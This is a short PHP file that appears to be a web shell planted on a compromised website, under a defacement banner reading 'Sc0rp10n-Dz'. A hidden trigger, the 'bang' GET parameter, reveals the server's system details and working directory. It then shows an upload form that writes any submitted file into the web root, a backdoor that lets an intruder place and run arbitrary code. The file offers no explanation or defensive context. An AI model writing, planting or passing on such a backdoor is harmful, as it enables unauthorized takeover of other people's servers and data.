<?php if(isset($_GET["bang"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo"<br><font color=#FFFFFF>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>
<title>Sc0rp10nDzExploiter</title><center><div id=q>Sc0rp10n-Dz<br><font color="#009900" size="3"><pre><img border="0" src="https://i.ibb.co/PZ3fbTy/CWNOqgm-VAAAp8-RG.jpg" width="0" height="0"></pre><style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}